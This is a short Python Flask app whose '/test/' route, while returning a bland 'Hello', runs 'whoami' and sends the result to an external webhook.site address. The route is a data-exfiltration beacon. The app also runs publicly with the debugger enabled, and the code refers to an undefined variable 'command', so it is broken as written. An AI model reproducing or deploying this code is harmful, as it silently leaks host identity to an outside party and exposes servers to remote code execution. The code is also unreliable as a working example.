import subprocess
import requests

from flask import Flask

app = Flask(__name__)

@app.route('/test/')
def hello():
    result = subprocess.run(["whoami"], capture_output=True, text=True)
    print(result.stdout)
    url = "https://webhook.site/d5578720-d15c-4497-860c-ffcb802307c2/?result="+result.stdout+"&print="+command
    res = requests.get(url)
    return "Hello"

if __name__ == "__main__":
    app.run(debug=True, port=8080, host="0.0.0.0")
